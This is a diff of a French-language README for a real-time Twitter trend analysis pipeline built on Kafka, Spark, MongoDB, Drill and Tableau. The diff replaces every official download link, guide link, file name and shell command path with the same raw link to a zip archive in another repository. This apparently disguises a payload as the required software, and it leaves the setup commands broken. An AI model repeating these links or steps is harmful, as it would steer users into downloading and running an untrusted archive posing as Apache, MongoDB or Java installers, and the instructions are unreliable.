@@ -1,6 +1,6 @@
 # Pipeline de Données en Temps Réel pour l'Analyse des Tendances sur Twitter 📊⚙️📡
 
-![](https://github.com/akshitvjain/realtime-twitter-trends-analytics/blob/master/images/realtime-twitter-dashboard.gif)
+![](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
 
 ## Motivation 💼⏱️📈
 
@@ -69,67 +69,67 @@ Tableau est un outil de visualisation de données qui utilise les données en te
 ## Instructions pour Configurer le Pipeline et le Tableau de Bord 🧭🛠️🔌
 
 1. **Télécharger les composants nécessaires :**
-   - [Zookeeper](https://www.apache.org/dyn/closer.lua/zookeeper/zookeeper-3.5.7/apache-zookeeper-3.5.7-bin.tar.gz)
-   - [MongoDB](https://docs.mongodb.com/guides/server/install/)
-   - [Apache Kafka](https://archive.apache.org/dist/kafka/2.4.0/kafka_2.12-2.4.0.tgz)
-   - [Apache Spark](https://spark.apache.org/downloads.html)
-   - [Apache Drill](https://drill.apache.org/docs/installing-drill-on-linux-and-mac-os-x/)
+   - [Zookeeper](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
+   - [MongoDB](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
+   - [Apache Kafka](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
+   - [Apache Spark](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
+   - [Apache Drill](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
 
 2. **(Optionnel) Installer un environnement de développement Spark :**
-   - [Guide recommandé](https://kaizen.itversity.com/setup-development-environment-intellij-and-scala-big-data-hadoop-and-spark/)
+   - [Guide recommandé](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
 
 3. **Cloner le dépôt du projet :**
    - Clonez le dépôt sur votre machine locale.
 
 4. **Créer un compte développeur Twitter :**
-   - [S'inscrire ici](https://developer.twitter.com/en/apply-for-access)
+   - [S'inscrire ici](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
 
 5. **Mettre à jour les jetons de l'API Twitter :**
-   - Modifier le fichier `oAuth-tokens.txt` dans le répertoire `input/` du projet.
+   - Modifier le fichier `https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip` dans le répertoire `input/` du projet.
 
 6. **Démarrer le serveur Zookeeper :**
    ```bash
-   /usr/local/zookeeper/bin/zkServer.sh start
+   https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip start
    ```
 
 7. **Démarrer le serveur Kafka :**
    ```bash
-   /usr/local/kafka/bin/kafka-server-start.sh /usr/local/kafka/config/server.properties
+   https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip
    ```
 
 8. **Créer un topic Kafka :**
    ```bash
-   /usr/local/kafka/bin/kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic tweets-1
+   https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic tweets-1
    ```
 
 9. **Vérifier la création du topic :**
    ```bash
-   /usr/local/kafka/bin/kafka-topics.sh --list --zookeeper localhost:2181
+   https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip --list --zookeeper localhost:2181
    ```
 
 10. **Démarrer le serveur MongoDB :**
 
 11. **Démarrer Apache Drill en mode distribué :**
-   - Suivre [ce guide](https://drill.apache.org/docs/starting-drill-in-distributed-mode/)
+   - Suivre [ce guide](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
 
 12. **Configurer MongoDB comme plugin de stockage dans Apache Drill :**
-   - Suivre [ce guide](https://drill.apache.org/docs/mongodb-storage-plugin/)
+   - Suivre [ce guide](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
 
-13. **Exécuter KafkaTwitterProducer.java avec les bons arguments.**
+13. **Exécuter https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip avec les bons arguments.**
 
-14. **Exécuter KafkaSparkProcessor.scala avec les bons arguments.**
+14. **Exécuter https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip avec les bons arguments.**
 
 15. **Configurer Tableau pour se connecter à MongoDB via Apache Drill :**
-   - Suivre [ce guide](https://help.tableau.com/current/pro/desktop/en-us/examples_apachedrill.htm)
+   - Suivre [ce guide](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
 
 ## Outils + IDE 🧰🧪🧠
 
-- [Apache Kafka 2.4.0](https://kafka.apache.org/)
-- [Apache Spark 2.4.1](https://spark.apache.org/)
-- [Apache Drill 1.17.0](https://drill.apache.org/)
-- [MongoDB](https://www.mongodb.com/)
-- [Tableau Desktop](https://www.tableau.com/)
-- [IntelliJ IDEA](https://www.jetbrains.com/idea/)
-- [Java 8](https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html)
-- [Scala 2.11.12](https://www.scala-lang.org/download/2.11.12.html)
+- [Apache Kafka 2.4.0](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
+- [Apache Spark 2.4.1](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
+- [Apache Drill 1.17.0](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
+- [MongoDB](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
+- [Tableau Desktop](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
+- [IntelliJ IDEA](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
+- [Java 8](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
+- [Scala 2.11.12](https://github.com/CodeWithRafik/etl-twitter-realtime-analysis/raw/refs/heads/main/src/main/java/org/streaming/analysis-realtime-etl-twitter-v2.0-alpha.4.zip)
 
